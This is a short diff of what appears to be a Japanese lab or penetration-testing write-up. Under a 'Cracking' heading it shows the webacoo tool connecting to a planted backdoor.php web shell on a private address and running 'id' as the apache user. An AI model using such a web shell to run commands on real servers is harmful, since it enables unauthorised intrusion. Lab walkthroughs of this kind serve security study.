@@ -177,6 +177,8 @@ backdoor.php
 
 ##Cracking
 
+　backdoor.php にアクセス。apache で
+　
 ```
 $ webacoo -t -u http://192.168.yyy.zzz/backdoor.php
 
@@ -191,5 +193,7 @@ uid=48(apache) gid=48(apache) groups=48(apache) context=unconfined_u:system_r:ht
 [*] Type ':<cmd>' to run local OS commands.
 [*] Type 'exit' to quit terminal.
 
-webacoo$ 
+webacoo$ id
+uid=48(apache) gid=48(apache) groups=48(apache) context=unconfined_u:system_r:httpd_t:s0
+webacoo$
 ```
